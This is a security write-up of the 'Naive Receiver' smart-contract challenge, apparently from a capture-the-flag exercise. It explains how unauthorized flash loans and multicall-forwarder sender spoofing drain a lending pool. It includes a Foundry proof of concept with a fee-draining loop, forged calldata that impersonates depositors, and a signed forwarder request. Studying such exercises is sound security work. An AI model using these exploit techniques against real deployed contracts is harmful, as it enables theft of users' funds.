# Security Report: Naive Receiver

---

## 1. Vulnerability Summary

The `NaiveReceiverPool` contains multiple security weaknesses that can be chained to drain the entire pool.

First, the pool allows anyone to initiate flash loans on behalf of the receiver without requiring the receiver's authorization. Since the flash loan fee is fixed at `1 WETH`, an attacker can repeatedly execute zero-amount flash loans to drain the receiver's funds through accumulated fees.

Second, the combination of `Multicall` using `delegatecall` and the trusted forwarder's `_msgSender()` implementation allows an attacker to manipulate the perceived caller of individual multicall operations.

By appending arbitrary addresses to individual calls, the attacker can impersonate the pool's depositors and withdraw their funds.

## 2. Affected Code

### A. Unrestricted Flash Loan Execution

**Contract:** `NaiveReceiverPool.sol`  
**Function:** `flashLoan()`

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // No authorization check on the receiver
    weth.transfer(address(receiver), amount);

    totalDeposits -= amount;

    if (
        receiver.onFlashLoan(
            msg.sender,
            address(weth),
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS
    ) revert CallbackFailed();

    uint256 amountWithFee = amount + FIXED_FEE;

    weth.transferFrom(
        address(receiver),
        address(this),
        amountWithFee
    );

    totalDeposits += amountWithFee;
    deposits[feeReceiver] += FIXED_FEE;

    return true;
}
```

**Root Cause:** The pool does not verify whether the receiver authorized the flash loan. An attacker can repeatedly initiate flash loans against another user's receiver contract.

Even a zero-amount flash loan charges the fixed `1 WETH` fee.

### B. Multicall Sender Spoofing

**Contract:** `Multicall.sol`

```solidity
function multicall(bytes[] calldata data)
    external
    virtual
    returns (bytes[] memory results)
{
    results = new bytes[](data.length);

    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(
            address(this),
            data[i]
        );
    }
}
```

**Root Cause:** `delegatecall` preserves the original `msg.sender` and executes each subcall using its supplied calldata.

### C. Trusted Forwarder Sender Resolution

**Contract:** `NaiveReceiverPool.sol`

```solidity
function _msgSender() internal view override returns (address) {
    if (
        msg.sender == trustedForwarder &&
        msg.data.length >= 20
    ) {
        return address(
            bytes20(msg.data[msg.data.length - 20:])
        );
    } else {
        return super._msgSender();
    }
}
```

**Root Cause:** The pool blindly trusts the final 20 bytes of forwarded calldata as the authenticated sender.

Combined with multicall, this allows individual subcalls to supply arbitrary sender addresses.

## 3. Exploitation Mechanism

The attack consists of two stages.

**Stage 1 – Drain the Flash Loan Receiver**

The attacker executes ten zero-amount flash loans:

```solidity
for (uint256 i = 0; i < 10; i++) {
    pool.flashLoan(receiver, address(weth), 0, data);
}
```

Each flash loan charges `1 WETH`, regardless of the borrowed amount.

After ten iterations:

- Initial receiver balance: 10 WETH.
- Total accumulated fees: 10 WETH.
- Final receiver balance: 0 WETH.
- Fee receiver balance increases by 10 WETH.

**Stage 2 – Exploit Multicall and Trusted Forwarder**

The attacker constructs two withdrawal calls:

```solidity
bytes memory innercall =
    abi.encodeCall(
        NaiveReceiverPool.withdraw,
        (1000e18, payable(address(recovery)))
    );

bytes memory innercall2 =
    abi.encodeCall(
        NaiveReceiverPool.withdraw,
        (10e18, payable(address(recovery)))
    );
```

The attacker then appends forged sender addresses:

```solidity
bytes memory modifiedcall =
    abi.encodePacked(innercall, deployer);

bytes memory modifiedcall2 =
    abi.encodePacked(innercall2, feeReceiver);
```

These addresses manipulate `_msgSender()` during the individual multicall executions.

The first call impersonates the deployer, while the second impersonates the fee receiver.

Consequently, the attacker can withdraw both recorded deposit balances to the recovery address.

## 4. Proof of Concept (Foundry)

### Step 1 – Drain Receiver

```solidity
for (uint256 i = 0; i < 10; i++) {
    pool.flashLoan(receiver, address(weth), 0, data);
}
```

### Step 2 – Construct Forged Multicall

```solidity
bytes[] memory calls = new bytes[](2);

calls[0] = modifiedcall;
calls[1] = modifiedcall2;

bytes memory requestData =
    abi.encodeCall(Multicall.multicall, (calls));
```

### Step 3 – Sign Forwarder Request

```solidity
bytes32 digest = keccak256(
    abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
    )
);

(uint8 v, bytes32 r, bytes32 s) =
    vm.sign(privateKey, digest);

bytes memory signature = abi.encodePacked(r, s, v);
```

The attacker signs the crafted forwarder request using an attacker-controlled private key.

### Step 4 – Execute Exploit

```solidity
bool success = forwarder.execute(request, signature);

assertEq(weth.balanceOf(address(pool)), 0e18);
```

The final assertion confirms that the pool's entire 1,010 WETH balance has been withdrawn.

## 5. Security Impact

- **Receiver Fund Drain:** The receiver's entire 10 WETH balance is extracted through repeated flash loan fees.
- **Unauthorized Withdrawals:** The attacker impersonates existing depositors through forged multicall calldata.
- **Complete Pool Drain:** Both the deployer's 1,000 WETH deposit and the fee receiver's 10 WETH balance are withdrawn.
- **Permissionless Exploitation:** No privileged role or ownership access is required.

## 6. Conclusion

This challenge demonstrates how seemingly independent vulnerabilities can be chained into a complete fund-draining attack.

The unrestricted flash loan mechanism enables unauthorized fee extraction, while the interaction between `delegatecall`, multicall, and trusted forwarder sender resolution enables sender spoofing.

**Result:** The Foundry PoC successfully demonstrates the extraction of the receiver's funds and the complete draining of the 1,010 WETH held by the pool.
